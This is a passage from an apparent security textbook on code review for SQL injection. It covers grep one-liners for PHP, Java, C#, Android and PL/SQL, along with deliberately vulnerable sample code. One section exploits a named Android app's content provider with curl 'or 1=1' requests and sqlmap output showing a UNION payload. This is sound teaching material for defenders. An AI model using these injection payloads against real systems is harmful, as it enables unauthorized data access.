mssql_bind($sp, “@paramTwo”, $_GET[‘var_two’], SQLVARCHAR, false, false, 50);  \nYou can easily combine these grep one-liners into a simple shell script and trivially modify \nthe output so that the data can be presented in XML, HTML, CSV, and other formats. You can \nuse the string searches to find all of the low -hanging fruit, such as the dynamic construction of \nparameters for input into stored procedures and SQL statements, where the input is not validated and is input directly from GET or POST parameters. The problem is that even though a lot of developers do not validate their input before using it in dynamically created SQL statements, they first copy the input to a named variable. For example, the following code would be vulnerable; however, our simple \ngrep strings would not identify lines of code such as \nthese:  \n$sql = “SELECT ∗  FROM TBL WHERE COLUMN = ‘$_GET[‘var’]’”  \n$result = mysql_query($sql, $link);  \nWe should amend our grep strings so that they identify the use of the functions themselves. \nFor example:  \n$ grep - r -n “mssql_query(\\ |mysql_query(\\ |mysql_db_query(\\ |oci_parse \n(\\|ora_parse(\\ |mssql_bind(\\ |mssql_execute( \\|odbc_prepare(\\ |odbc_execute \n(\\|odbc_execute(\\ |odbc_exec(”src/ | awk -F:‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: \n“$3”\\n\\n”}’ \nThe output from the preceding command will identify all of the same lines of code that the \nprevious grep strings would; however, it will also identify all points in  the source code where \nthe potentially dangerous functions are being used, and it will identify a number of lines that will require manual inspection. For example, it may identify the follow ing line:  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 20  \nmatch: $result = mysql_query($sql);  \nThe mysql_query()  function is used to send a query to the currently active database. You can \nsee from the line found that the function is in use. However, you do not know what the value of the \n$sql variable is; it probably contains an SQL statement to execute, but you do not know \nwhether it was built using user input or whether it is tainted. So, at this stage, you cannot say whether a vulnerability exists. You need to trace the \n$sql variable. To do this you can use the \nfollowing command:  \n$ grep - r -n “\\$sql” src/ | awk - F: ‘{print “filename: “$1”\\ nline: “$2” \\nmatch: “$3”\\ n\\n”}’ \nThe problem with the preceding command is that often, developers reuse variables or use \ncommon names, so you may end up with some results that do not correspond to the function \nyou are investigating. You can improve the situation by expanding the command to search for common SQL commands. You could try the following \ngrep command to identify points in the \ncode where dynamic SQL statements are created:  \n$ grep – i -r -n “\\$sql =.∗ \\”\\(SELECT\\ |UPDATE\\ |INSERT\\ |DROP\\) ” src/ | awk -F: ‘{print \n“filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ \nIf you’re very lucky, you will find only one match, as illustrated here:  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 20  \nmatch: $sql = “SELECT ∗ FROM table WHERE field = ‘ $_GET[‘input’]’”; \nIn the real world, it is likely that with an ambiguous variable name such as “ $sql,” you \nwould identify a number of lines in a number of different source files, and you would need to ensure that you are dealing with the right variable and the right function, class, or procedure. You can see from the output that the SQL statement is a SELECT statement and it is being built with user -controlled data that is being presented to the application inside a get met hod. \nThe parameter name is name. You can be confident that you have discovered an SQL vulnerability, as it appears that the user data obtained from the input parameter was concatenated with the \n$sql variable before being passed to a function that executes the \nstatement against a database. However, you could just as easily have received the following output:  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 20  \nmatch: $sql = “SELECT ∗  FROM table WHERE field = ‘ $input’” ; \nYou can see from the preceding output that the SQL statement is a SELECT statement and it \nis being concatenated with the contents of another variable, $input . You do not know what the \nvalue of $input  is, and you don’t know whether it contains user -controlled data or whether it is \ntainted. So, you c annot say whether a vulnerability exists. You need to trace the $input  \nvariable. To do this you can use the following command:  \n$ grep -r -n “\\$input =.∗ \\$.∗” src/ | awk - F: ‘{print “filename: “$1”\\nline: “$2”\\nmatch: \n“$3”\\n\\n”}’ \nThe preceding command will allow you to search for all instances where the $input  variable \nis assigned a value from an HTTP request method, such as $_GET , $HTTP_GET_VARS , $_POST , \n$HTTP_POST_VARS , $_REQUEST , $_COOKIE , $HTTP_COOKIE_VARS , $_SERVER , and $HTTP_SERVER_VARS , as well \nas any  instance where the value is set from another variable. From the following output you \ncan see that the variable has been assigned its value from a variable submitted via the post \nmethod:  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 10  \nmatch: $input = $_POST[‘name’];  \nYou now know that the $input  variable has been populated from a user -controlled parameter \nsubmitted via an HTTP post request and that the variable has been concatenated with an SQL statement to form a new string variable (\n$sql). The SQL statement is then passed to a function \nthat executes the SQL statement against a MySQL database.  \nAt this stage, you may feel tempted to state that a vulnerability exists; however, you still \ncan’t be sure that the $input  variable is tainted. Now that you know that  the field contains user -\ncontrolled data, it is worth performing an extra search on just the variable name. You can use the following command to do this:  \n$ grep -r -n “\\$input” src/ | awk -F: ‘{print “filename: “$1” \\nline: “$2” \\nmatch: \n“$3”\\n\\n”}’ \nIf the p receding command returns nothing more than the previous results, you can safely \nstate that a vulnerability exists. However, you may find code similar to the following:  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 11  \nmatch: if (is_string($input)) {  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 12  \nmatch: if (strlen($input) < $maxlength){  \nfilename: src/SQLi.MySQL.vulnerable.php  \nline: 13  \nmatch: if (ctype_alnum($input)) {  \nThe preceding output appears to suggest that the developer is performing some input \nvalidation on the user -controlled input parameter. The $input  variable is being checked to \nensure that it is a string, conforms to a set boundary, and consists of alphanume ric characters \nonly. You have now traced the user input through the application, you have identified all of the \ndependencies, you have been able to make informed decisions about whether a vulnerability exists, and most importantly, you are in a position to provide evidence to support your claims. \nNow that you are well versed in reviewing PHP code for SQL injection vulnerabilities, let’s \ntake a look at applying the same techniques to a Java application. To save repetition the following two sections will not cover all eventualities in depth; instead, you should use the techniques outlined in this section to assist you when reviewing other languages (however, the following sections will give you enough detail to get you started).  \nFollowing Data in Java  \nYou can use the following command to recursively search a directory of Java source files for \nthe use of \nprepareStatement() , executeQuery() , executeUpdate() , execute() , addBatch() , and \nexecuteBatch() : \n$ grep - r -n \n“preparedStatement(\\ |executeQuery( \\|executeUpdate(\\ |execute(\\ |addBatch( \\|executeBatch(” \nsrc/ | awk - F: ‘{print “filename: “$1” \\nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ \nThe results of executing the preceding command are shown here. You can clearly see that \nyou have identified three lines of code that warrant  further investigation:  \nfilename: src/SQLVuln.java  \nline: 89  \nmatch: ResultSet rs = statement.executeQuery(sql);  \nfilename: src/SQLVuln.java  \nline: 139  \nmatch: statement.executeUpdate(sql);  \nfilename: src/SQLVuln.java  \nline: 209  \nmatch: ResultSet rs = statement.ex ecuteQuery(“  \nSELECT field FROM table WHERE field = “ + request.getParameter(“input”));  \nLines 89 and 139 warrant further investigation because you do not know the value of the sql \nvariable. It probably contains an SQL statement to execute, but you do not know whether it \nwas built using user input or whether it is tainted. So, at this stage you cannot say whether a vulnerability exists. You need to trace the \nsql variable. However, you can see that on line 209 \nan SQL statement is built from user -controlled inp ut. The statement does not validate the value \nof the input  parameter submitted via an HTTP Web form, so it is tainted. You can state that \nline 209 is vulnerable to SQL injection. However, you need to work a little harder to investigate lines 89 and 139. You could try the following \ngrep command to identify points in \nthe code where a dynamic SQL statement is built and assigned to the sql variable:  \n$ grep –i -r -n “sql =.∗ \\”\\(SELECT\\ |UPDATE\\|INSERT\\ |DROP\\)” src/ | awk -F: ‘{print \n“filename: “$1”\\nline: “$2”\\nmatch: “$3”\\ n\\n”}’ \nfilename: src/SQLVuln.java  \nline: 88  \nmatch: String sql = (“SELECT field FROM table WHERE field = ” + \nrequest.getParameter(“input”));  \nfilename: src/SQLVuln.java  \nline: 138  \nmatch: String sql = (“INSERT INTO table VALUES field = (” + request.getParameter (“input”) + \n”) WHERE field = ” + request.getParameter(“more -input”) + ”);  \nYou can see that on lines 88 and 138 an SQL statement is built from user -controlled input. \nThe statem ent does not validate the value of the parameters submitted via an HTTP Web form. \nYou have now traced the user input through the application, have been able to make informed \ndecisions about whether a vulnerability exists, and are in a position to provide e vidence to \nsupport your claims. \nIf you want to identify sink sources so that you can effectively trace tainted data back to its \norigin you can use the following command:  \n$ grep -r -n “getParameter(\\ |getParameterValues(\\ |getQueryString(\\ |getHeader \n(\\|getHeaders( \\|getRequestedSessionId( \\|getCookies(\\ |getValue(” src/ | awk -F: ‘{print \n“filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ \nNow that you are well versed in reviewing PHP and Java code for SQL injection \nvulnerabilities, it’s time to test your skills by ap plying the same techniques to a C# application. \nFollowing Data in C#  \nYou can use the following command to recursively search a directory of C# source files for the use of \nSqlCommand() , SqlParameter() , OleDbCommand() , OleDbParameter() , OracleCommand() , \nOracleParameter() , OdbcCommand() , and OdbcParameter() : \n$ grep - r -n “SqlCommand(\\ |SqlParameter( \\|OleDbCommand(\\ |OleDbParameter \n(\\|OracleCommand(\\ |OracleParameter(\\ |OdbcCommand(\\ |OdbcParameter(” src/ | awk - F: ‘{print \n“filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ \nfilename: src/SQLiMSSQLVuln.cs  \nline: 29  \nmatch: SqlCommand command = new SqlCommand(“SELECT ∗ FROM table WHERE field = ’” + \nrequest.getParameter(“ input”) + “’”, conn);  \nfilename: src/SQLiOracleVuln.cs  \nline: 69  \nmatch: OracleCommand command = new OracleCommand(sql, conn);  \nLine 69 warrants further investigation, as you do not know the value of the sql variable. It \nprobably contains an SQL statement to execute, but you do not know whether it was built \nusing user input or whether it is tainted. So, at this st age you cannot say whether a \nvulnerability exists. You need to trace the sql variable. However, you can see that on line 29 \nan SQL statement is built from user -controlled input. The statement does not validate the value \nof the input parameter submitted via an HTTP Web form, so it is tainted. You can state that line 29 is vulnerable  to SQL injection. However, you need to work a little harder to investigate \nline 69. You could try the following \ngrep command to identify points in the code where a \ndynamic SQL statement is built and assigned to the sql variable:  \n$ grep –i -r -n “sql =.∗ \\” \\(SELECT\\ |UPDATE\\|INSERT\\ |DROP\\) ” src/ | awk -F: ‘{print \n“filename: “$1”\\ nline: “$2”\\ nmatch: “$3”\\ n\\n”}’ \nfilename: src/SQLiOracleVuln.cs  \nline: 68  \nmatch: String sql = “SELECT ∗  FROM table WHERE field = ’” + request.getParameter(“ input”) + \n“’”; \nYou can see  that on line 68 an SQL statement is built from user -controlled input. The \nstatement does not validate the value of the parameter submitted via an HTTP Web form and is tainted. You have now traced the user input through the application, you have been able to make informed decisions about whether a vulnerability exists, and you are in a position to provide evidence to support your claims. \nIf you want to identify \nsink sources  so that you can effectively trace tainted data back to \ntheir origin, you can use the  following command:  \n$ grep - r -n \n“HttpCookieCollection\\ |Form\\|Headers\\ |Params\\ |QueryString\\ |ServerVariables\\ |Url\\|UserAgent\n\\|UserHostAddress\\ |UserHostName” src/ | awk - F: ‘{print “filename: “$1”\\ nline: \n“$2”\\nmatch: “$3”\\ n\\n”}’ \nIn real life, you may have to  amend the grep strings several times, rule out findings due to \nthe ambiguous naming schemes in use by a given developer, and follow the execution flow \nthrough the application, perhaps having to analyze numerous files, includes, and classes. \nHowever, the t echniques you learned here should be very useful in your endeavors.  \nReviewing Android Application Code  \nSince the first incarnation of this book smart phone applications, such as those written for the Android platform, have increased their presence in the corporate  world exponentially. Many \ncompanies have embraced the platform for the deployment of custom -built in -house business \napplications as well as purchasing of third party developed applications for use within corporate environments. I’ve personally been performing a lot of mobile application assessments on all of the major platforms (iOS, Blackberry OS,  Android, etc.). When assessing \nAndroid devices and applications I regularly come across vulnerabilities in Android Content -\nProviders. These vulnerabilities are often similar to those found in Web application security assessments. In particular SQL injection and directory traversal vulnerabilities are common problems in Content -Providers. Here we will obviously concentrate on the SQL injection \nissues. Content -Providers store and retrieve data and make them accessible to all applications \n(http://developer.android.com/guide/topics/providers/content -providers.html ). \nNils, a colleague at MWR InfoSecurity authored a tool named “WebContentResolver” \n(http://labs.mwrinfosecurity.com/tools/android_webcontentresolver ) that can run on an \nAndroid device (or emulator) and exposes a Web service interface to all -installed Content -\nProviders. This allows us  to use a Web browser to test for vulnerabilities and leverage the \npower of tools, such as sqlmap ( http://sqlmap.sourceforge.net ), to find and exploit \nvulnerabilities in Content -Providers. I recommend you give it a go if you are assessing \nAndroid applications.  \nIn this section I’m going to show you how to leverage the same techniques that you have \nlearnt to use for traditional Web applications written in Java, PHP, and .NET against Android applications (Java) to find SQL injection vulnerabilities within SQLite databases; however the WebContentResolver utility will prove useful when you want to validate your findings and create Proof of Concept (PoC) exploits for the discovered vulnerabilities —Chapter 4  goes into \nmore detail about how to leverage this tool to find and exploit SQL injection vulnerabilities in Android applications.  \nIf you do not have access to the source; then it is a trivial process to gain access to the \nsource code of an Android application. Android runs applications that are in Dalvik Executable (.dex) format and the Android application package file (APK) can easily be converted to a Java \nArchive (JAR) using a utility such as dex2jar ( http://code.google.com/p/dex2jar ). A Java de -\ncompiler, such as jdgui ( http://java.decompiler.free.fr/?q=jdgui) and/or jad \n(www.varan eckas.com/jad ), can then be used to decompile and view the source.  \nAs before, we need to become familiar with the “Dangerous functions”—Android \ndevelopers make use of two classes to interact with the SQLite database: SQLiteQueryBuilder \nand SQLiteDatabase. The android.database.sqlite.SQLiteQueryBuilder  is a convenience class \nthat helps build SQL queries to be sent to SQLiteDatabase objects \n(http://developer .android.com/reference/android/database/sqlite/SQLiteQueryBuilder.html ) \nand the android.database.sqlite.SQLiteDatabase  class exposes methods to manage SQLite \ndatabases \n(http://developer.android.com/reference/android/database/sqlite/SQLiteDatabase.html ). The \nrelevant methods for the classes are detailed below:  \n// android.database.sqlite.SQLiteQueryBuilder  \n// Construct a SELECT statement suitable for use in a group of SELECT statements that will \nbe joined through UNION operators in buildUnionQuery.  \nbuildQuery(String[] projectionIn, String selection, String groupBy, String having, String \nsortOrder, String limit)  \n // Build an SQL query string from the given clauses.  \nbuildQueryString(boolean distinct, String tables, String[] columns, String where, String \ngroupBy, String having, String orderBy, String limit)  \n// Given a set of subqueries, all of which are SELECT statements, construct a query that \nreturns the union of what those subqueries return  \nbuildUnionQuery(String[] subQueries, String sortOrder, String limit)  \n// Construct a SELECT statement suitable for use in a group of SELECT statements that will \nbe joined through UNION operators in buildUnionQuery.  \nbuildUnionSubQuery(String typeDiscriminatorColumn, String[] unionColumns, Set<String> \ncolumnsPresentInTable, int computedColumnsOffset, String typeDiscriminatorValue, String \nselection, String groupBy, String having)  \n// Perform a query by combining all curr ent settings and the information passed into this \nmethod.  \nquery(SQLiteDatabase db, String[] projectionIn, String selection, String[] selectionArgs, \nString groupBy, String having, String sortOrder, String limit)  \n// android.database.sqlite.SQLiteDatabase  \n// Convenience method for deleting rows in the database.  \ndelete(String table, String whereClause, String[] whereArgs)  \n// Execute a single SQL statement that is NOT a SELECT or any other SQL statement that \nreturns data.  \nexecSQL(String sql)  \n// Execute a single SQL statement that is NOT a SELECT/INSERT/UPDATE/DELETE.  \nexecSQL(String sql, Object[] bindArgs)  \n// Convenience method for inserting a row into the database.  \ninsert(String table, String nullColumnHack, ContentValues values)  \n// Convenience method for inserting a row into the database.  \ninsertOrThrow(String table, String nullColumnHack, ContentValues values)  \n// General method for inserting a row into the database.  \ninsertWithOnConflict(String table, String nullColumnHack, ContentValues initialValues, int \nconflictAlgorithm)  \n// Query the given table, returning a Cursor over the result set.  \nquery(String table, String[] columns, String selection, String[] selectionArgs, String \ngroupBy, String having, String orderBy, String limit)  \n// Query the given URL, returning a Cursor over the result set.  \nqueryWithFactory(SQLiteDatabase.CursorFactory cursorFactory, boolean distinct, String table, \nString[] columns, String selection, String[] selectionArgs, String groupBy, String having, \nString orderBy, String limit)  \n// Runs the provided SQL and returns a Cursor over the result set.  \nrawQuery(String sql, String[] selectionArgs)  \n// Runs the provided SQL and returns a cursor over the result set. \nrawQueryWithFactory(SQLiteDatabase.CursorFactory cursorFactory, String sql, String[] \nselectionArgs, String editTable)  \n// Convenience method for replacing a row in the database.  \nreplace(String table, String nullColumnHack, ContentValues initialValues)  \n// Convenience method for replacing a row in the database.  \nreplaceOrThrow(String table, String nullColumnHack, ContentValues initialValues)  \n// Convenience method for updating rows in the database.  \nupdate(String table, ContentValues values, String whereCla use, String[] whereArgs)  \n// Convenience method for updating rows in the database.  \nupdateWithOnConflict(String table, ContentValues values, String whereClause, String[] \nwhereArgs, int conflictAlgorithm)  \nThe shell one -liner below can be used to recursively s earch the file system for source files \nthat contain references to the methods of the aforementioned classes:  \n$ grep - r -n \n“delete(\\ |execSQL( \\|insert(\\ |insertOrThrow(\\ |insertWithOnConflict( \\|query(\\ |queryWithFacto\nry(\\|rawQuery( \\|rawQueryWithFactory(\\ |replace(\\ |replaceOrThrow(\\ |update( \\|updateWithOnConf\nlict(\\|buildQuery( \\|buildQueryString(\\ |buildUnionQuery(\\ |buildUnionSubQuery(\\ |query(” src/ \n| awk -F: ‘{print “filename: “$1”\\ nline: “$2”\\ nmatch: “$3” \\n\\n”}’ \nAs previously discussed it is often necessary to trac e the data through the application, as the \noutput of the command above may identify an immediately obvious vulnerability, or it could \nprovide you with a variable that you need to trace in order to determine if it has been built with \ntainted data. The command below can be used to search for string declarations that contain dynamic SQL statements to aid in your efforts:  \n$ grep -i -r -n “String.∗ =.∗\\”\\(SELECT\\ |UPDATE\\|INSERT\\ |DROP\\)” src/ | awk -F: ‘{print \n“filename: “$1”\\nline: “$2”\\nmatch: “$3”\\n\\n”}’ \nAn example of how these techniques can be leveraged against a real world application is \npresented below (with some output omitted for brevity):  \n$ svn checkout http://android- sap-note-viewer.googlecode.com/svn/trunk/sap- note-viewer  \n$ grep - r -n \n“delete(\\ |execSQL( \\|insert(\\ |insertOrThrow(\\ |insertWithOnConflict( \\|query(\\ |queryWithFacto\nry(\\|rawQuery( \\|rawQueryWithFactory(\\ |replace(\\ |replaceOrThrow(\\ |update( \\|updateWithOnConf\nlict(\\|buildQuery( \\|buildQueryString(\\ |buildUnionQuery(\\ |buildUnionSubQuery(\\ |query(“sap-\nnote-viewer/ | awk - F: ‘{print “filename: “$1”\\ nline: “$2” \\nmatch: “$3” \\n\\n”}’ \nfilename: sap- note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java  \nline: 106  \nmatch: public Cursor query(Uri uri, String[] projection, String selection, String[] \nselectionArgs, String sortOrder) {  \nfilename: sap- note-viewer/SAPNoteView/src/org/sapmentors/sapnoteview/db/SAPNoteProvider.java  \nline: 121  \nmatch: Cursor c = qBuilder.query(db, projection, selection, selectionArgs, null, null, \nsortOrder);  \nWe can see that we have two lines of particular interest. The parameters of a Content -\nProvider break down as follows:  \n• Uri:  the URI requested  \n• String[] pro jection: representing the columns (projection) to be retrieved \n• String[] selection: the columns to be included in the WHERE clause  \n• String[] selectionArgs:  the values of the selection columns  \n• String sortOrder:  the ORDER BY statement  \nAs can be seen from  the source below, the input is implicitly trusted and therefore we have \nidentified a SQL injection vulnerability:  \n@Override  \npublic Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, \nString sortOrder) {  \n  SQLiteQueryBuilder qBuilder = new SQLiteQueryBuilder();  \n qBuilder.setTables(DATABASE_TABLE);  \n //if search is empty add a wildcard, it has content add wildcard before and after  \n if(selectionArgs!=null && selectionArgs[0].length()==0){  \n  selectionArgs[0] = “%”;  \n  } \n else if (selectionArgs!=null && selectionArgs[0].length()>0){  \n  selectionArgs[0] = “%” +selectionArgs[0]+ “%”;  \n  } \n //map from internal fields to fields SearchManager understands  \n qBuilder.setProjectionMap(NOTE_PROJECTION_MAP);  \n SQLiteDatabase db = dbHelper.getReadableDatabase();  \n //do the query  \n Cursor c = qBuilder.query(db, projection, selection, selectionArgs, null, null, sortOrder); \nreturn c;  \n } \nTo prove the exploitability of the vulnerability, the WebContentResolver utility should be \ninstalled along side the vulnerable application. The utility exposes a Web service interface to \nall-installed Content -Providers. We can use the WebContentResolver ut ility to list the \naccessible Content -Provider as illustrated below:  \n$ curl http://127.0.0.1:8080/list  \n package: org.sapmentors.sapnoteview  \n authority: org.sapmentors.sapnoteview.noteprovider  \n exported: true  \n readPerm: null  \n writePerm: null  \nWe can then query the Content Provider as such:  \n$ curl \nhttp://127.0.0.1:8080/query?a=org.sapmentors.sapnoteview.noteprovider?&selName=_id&selId=1\n1223 \nQuery successful:  \nColumn count: 3  \nRow count: 1  \n| _id | suggest_text_1 | suggest_intent_data  \n| 11223 | secret text | 11223  \nThe SQL statement that is actually executed is illustrated below:  \nSELECT _id, title AS suggest_text_1, _id AS suggest_intent_data FROM notes WHERE (_id=11223)  \nWe can then test for SQL injection within the selection as such:  \n$ curl \nhttp://127.0.0.1:8080/query?a=org.sapmentors.sapnoteview.noteprovider?&selName=_id&selId=1\n1223%20or%201=1  \nQuery successful:  \nColumn count: 3  \nRow count: 4  \n| _id | suggest_text_1 |suggest_intent_data  \n| 11223 | secret text | 11223  \n| 12345 | secret text | 12345  \n| 54321 | super secret text | 54321  \n| 98765 | shhhh secret | 98765  \nThe SQL statement that is executed is presented below:  \nSELECT _id, title AS suggest_text_1, _id AS suggest_intent_data FROM notes WHERE (_id=11223 \nor 1=1)  \nNote that both the selName  and selId  parameters are vulnerable. Exploitation can then be \nautomated using sqlmap:  \n$ ./sqlmap.py - u \n“http://127.0.0.1:8080/query?a =org.sapmentors.sapnoteview.noteprovider?&selName=_id&selId=\n11223’-b--dbms=sqlite  \n sqlmap/1.0 -dev (r4409) - automatic SQL injection and database takeover tool  \n http://www.sqlmap.org  \n[!] legal disclaimer: usage of sqlma p for attacking targets without prior mutual consent is \nillegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program\n \n[∗] starting at 18:12:33  \n[18:12:33] [INFO] using \n‘/Users/nmonkee/toolbox/application/sqli/sqlmap/output/127.0.0.1/session’ as session file  \n[18:12:33] [INFO] testing connection to the target url  \n[18:12:33] [INFO] testing if the url is stable, wait a few seconds  \n[18:12:34] [INFO] url is stable  \n[18:12:34] [INFO] testing if GET parameter ‘a’ is dynamic  \n[18:12:34] [INFO] confirming that GET parameter ‘a’ is dynamic  \n[18:12:34] [INFO] GET parameter ‘a’ is dynamic  \n[18:12:35] [WARNING] heuristic test shows that GET parameter ‘a’ might not be injectable  \n[18:12:35] [INFO] testing sql injection on GET parameter ‘a’  \n[18:12:35] [INFO] testing ‘AND boolean -based blind -  WHERE or HAVING clause’  \n[18:12:36] [INFO] testing ‘Generic UNION query (NULL) - 1 to 10 columns’  \n[18:12:39] [WARNING] GET parameter ‘a’ is not injectable  \n[18:12:39] [INFO] testing if GET parameter ‘selName’ is dynamic  \n[18:12:39] [INFO] confirming that GET parameter ‘selName’ is dynamic  \n[18:12:39] [INFO] GET parameter ‘selName’ is dynamic  \n[18:12:39] [WARNING] heuristic test shows that GET parameter ‘selName’ might not be \ninjectable  \n[18:12:39] [INFO] testing sql injection on GET parameter ‘selName’  \n[18:12:39] [INFO] testing ‘AND boolean -based blind -  WHERE or HAVING clause’  \n[18:12:40] [INFO] testing ‘Generic UNI ON query (NULL) - 1 to 10 columns’  \n[18:12:40] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed \nto find the right number of query columns. Automatically extending the range for UNION \nquery injection technique  \n[18:12:41] [INFO] target url appears to have 3 columns in query  \n[18:12:41] [INFO] GET parameter ‘selName’ is ‘Generic UNION query (NULL) -  1 to 10 columns’ \ninjectable  \nGET parameter ‘selName’ is vulnerable. Do you want to keep testing the others? [y/N] n  \nsqlmap identified the following injection points with a total of 79 HTTP(s) requests:  \n--- \nPlace: GET  \nParameter: selName  \n Type: UNION query  \n Title: Generic UNION query (NULL) - 3 columns  \n Payload: a=org.sapmentors.sapnoteview.noteprovider?&selName=_id) UNION ALL SELECT NULL, \n‘:xhc:’||‘xYEvUtVGEm’||‘:cbo:’, NULL--  AND (828=828&selId=11223  \n--- \n[18:12:46] [INFO] the back- end DBMS is SQLite  \n[18:12:46] [INFO] fetching banner  \nback-end DBMS: SQLite  \nbanner: ‘3.6.22’  \n[18:12:46] [INFO] Fetched data logged to text files under \n‘/Users/nmonkee/toolbox/application/sqli/sqlmap/output/127.0.0.1’  \n[∗] shutting down at 18:12:46  \nReviewing PL/SQL and T -SQL Code  \nOracle PL/SQL and Microsoft Transact -SQL (T -SQL) codes are very different and in most \ncases more insecure than conventio nal programming codes such as PHP, .NET, Java, and the \nlike. For example, Oracle has historically suffered from multiple PL/SQL  injection \nvulnerabilities in code within the built- in database packages that are shipped by default with \nthe database product. P L/SQL code executes with the privileges of the definer, and therefore \nhas been a popular target for attackers looking for a reliable way to elevate their privileges. So \nmuch so that Oracle itself has ironically published a paper dedicated to educating deve lopers \non how to produce secure PL/SQL (www.oracle.com/technology/tech/pl_sql/pdf/how_to_write_injection_proof_plsql.pdf ). \nHowever, a stored procedure c an run either with the rights of the caller (\nauthid current_user ) \nor with the rights of the procedure’s owner ( authid definer ). You can specify this behavior \nwith the authid  clause when creating a procedure.  \nProgramming codes such as T -SQL and PL/SQL are n ot usually made available to you in \nhandy text files, though. To analyze the source of a PL/SQL procedure you have two options. The first is to export the source code from the database. To achieve this you can use the \ndbms_metadata  package. You can use the  following SQL ∗Plus script to export the Data \nDefinition Language (DDL) statements from the Oracle database. DDL statements are SQL statements that define or alter a data structure such as a table. Hence, a typical DDL statement is \ncreate table  or alter table : \n-- Purpose: A PL/SQL script to export the DDL code for all database objects  \n-- Version: v 0.0.1  \n-- Works against: Oracle 9i, 10g and 11g  \n-- Author: Alexander Kornbrust of Red- Database- Security GmbH  \n-- \nset echo off feed off pages 0 trims on term on trim on linesize 255 long 500000 head off  \n-- \nexecute DBMS_METADATA.SET_TRANSFORM_PARAM(DBMS_METADATA.SESSION_TRANSFORM,‘STORAGE’,false);  \nspool getallunwrapped.sql  \n-- \nselect ‘spool ddl_source_unwrapped.txt’ from dual;  \n-- \n-- create a SQL scripts containing all unwrapped objects  \nselect ‘select dbms_metadata.get_ddl(’’’||object_type||’’’,’’’||object_name||’’’,’’’|| \nowner||’’’) from dual;’  \nfrom (select ∗  from all_objects where object_id not in(select o.obj# from source$ s, obj$ \no,user$ u where ((lower(s.source) like ‘%function%wrapped%’) or (lower (s.source) like \n‘%procedure%wrapped%’) or (lower(s.source) like ‘%package%wrapped%’)) and o.obj#=s.obj# and u.user#=o.owner#))\n \nwhere object_type in (‘FUNCTION’, ‘PROCEDURE’, ‘PACKAGE’, ‘TRIGGER’) and owner in (‘SYS’)  \norder by owner,object_type,object_name;  \n-- \n-- spool a spool off into the spool file.  \nselect ‘spool off’ from dual;  \nspool off  \n-- \n-- generate the DDL_source  \n-- \n@getallunwrapped.sql  \nquit \nThe second option available to you is to construct your own SQL statements to search the \ndatabase for interesting PL/SQL codes. Oracle stores PL/SQL source codes within the \nALL_SOURCE and DBA_SOURCE views; that is, if the code has not been obfuscated \n(obfu scation is a technique used to convert human- readable text into a format that is not easily \nread). You can do this by accessing the TEXT column from within one of the two views. Of \nimmediate interest should be any code that utilizes the execute immediate  or dbms_sql  function. \nOracle PL/SQL is case- insensitive, so the code you are searching for could be constructed as \nEXECUTE, execute, or ExEcUtE, and so forth. Therefore, be sure to use the lower(text)  \nfunction within your query. This converts the value of t ext to lowercase so that your LIKE \nstatement will match all of these eventualities. If unvalidated input is passed to these functions, just like within the previous application programming language examples, it may be possible to inject arbitrary SQL state ments. You can use the following SQL statement to obtain the \nsource for PL/SQL code:  \nSELECT owner AS Owner, name AS Name, type AS Type, text AS Source FROM  \ndba_source WHERE ((LOWER(Source) LIKE ‘%immediate%’) OR (LOWER(Source) LIKE  \n‘%dbms_sql’)) AND owner= ‘PLSQL’;  \nOwner Name Type Source  \n-------------------------------------------------  \nPLSQL DSQL PROCEDURE execute immediate(param);  \nOwner Name Type Source  \n-------------------------------------------------  \nPLSQL EXAMPLE1 PROCEDURE execute immediate(‘select cou nt(∗) from ’ ||param) into i;  \nOwner Name Type Source  \n-------------------------------------------------  \nPLSQL EXAMPLE2 PROCEDURE execute immediate(‘select count(∗ ) from all_users where \nuser_id=’ ||param) into i;  \nThe output from the search query has presented three very likely candidates for closer \ninspection. The three statements are vulnerable because user -controlled data are passed to the \ndangerous functions without being validated. However, similar to applicati on developers, \ndatabase administrators (DBAs) often first copy parameters to locally declared variables. To \nsearch for PL/SQL code blocks that copy parameter values into dynamically created SQL \nstrings you can use the following SQL statement:  \nSELECT text AS Source FROM dba_source WHERE name=‘SP_STORED_PROCEDURE’ AND owner=‘SYSMAN’ \norder by line;  \nSource  \n----------------------------------------------------------------------  \n1 CREATE OR REPLACE PROCEDURE SP_StoredProcedure (input IN VARCHAR2) AS  \n2 sql VARCHAR2 ; \n3 BEGIN  \n4 sql:=‘SELECT field FROM table WHERE field =’’’ || input || ’’’’;  \n5 EXECUTE IMMEDIATE sql;  \n6 END;  \nThe preceding SQL statement has found a package that dynamically creates an SQL \nstatement from user -controlled input. It would be worth taking a cl oser look at this package. \nYou can use the following SQL statement to dump the source for the package so that you can inspect things a little more closely:  \nSELECT text AS Source FROM dba_source WHERE name=‘SP_STORED_PROCEDURE’ AND owner=‘SYSMAN’ \norder by l ine; \nSource  \n-------------------------------------------------------------------------  \n1 CREATE OR REPLACE PROCEDURE SP_ StoredProcedure (input IN VARCHAR2) AS  \n2 sql VARCHAR2;  \n3 BEGIN  \n4 sql:= ‘SELECT field FROM table WHERE field = ’’’ || input || ’’’’;  \n5 EXECUTE IMMEDIATE sql;  \n6 END;  \nIn the preceding case, the input  variable is taken directly from the user input and \nconcatenated with the SQL string sql. The SQL string is passed to the EXECUTE function as a \nparameter and is executed. The preceding Oracle stor ed procedure is vulnerable to SQL \ninjection even though the user input is passed to it as a parameter.  \nYou can use the following PL/SQL script to search all PL/SQL codes in the database to find \na code that is potentially vulnerable to SQL injection. You wi ll need to closely scrutinize the \noutput, but it should help you to narrow your search:  \n-- Purpose: A PL/SQL script to search the DB for potentially vulnerable  \n-- PL/SQL code  \n-- Version: v 0.0.1  \n-- Works against: 